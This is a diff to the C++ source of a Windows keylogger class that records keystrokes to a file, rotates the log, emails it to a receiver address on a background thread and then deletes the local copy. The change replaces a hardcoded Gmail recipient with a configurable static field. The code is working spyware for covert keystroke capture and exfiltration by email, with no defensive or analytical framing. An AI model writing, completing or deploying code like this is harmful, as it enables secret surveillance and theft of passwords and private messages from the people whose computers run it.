@@ -1,6 +1,6 @@
 #include "KeyboardLogger.h"
 
-
+string KeyboardLogger::emailReceiver;
 
 KeyboardLogger::KeyboardLogger(long long maxLength, string emailReceiver)
 {
@@ -52,7 +52,7 @@ void KeyboardLogger::addMessage(string mes)
 		wstring newName = this->renameCurrentFile();
 		wstring *name = new wstring(newName);
 		DWORD id;
-		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&sendFileNewThread, (LPVOID) name, NULL, &id);
+		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&this->sendFileNewThread, (LPVOID) name, NULL, &id);
 		hFile = CreateFile(FILE_NAME,
 			GENERIC_WRITE,
 			0,
@@ -117,7 +117,7 @@ wstring KeyboardLogger::renameCurrentFile()
 void KeyboardLogger::sendFileNewThread(LPVOID arg)
 {
 	wstring *fileName = (wstring *)arg;
-	Email email("hAzy142@gmail.com");
+	Email email(emailReceiver);
 	email.send(*fileName);
 	DeleteFile(fileName->c_str());
 	delete fileName;
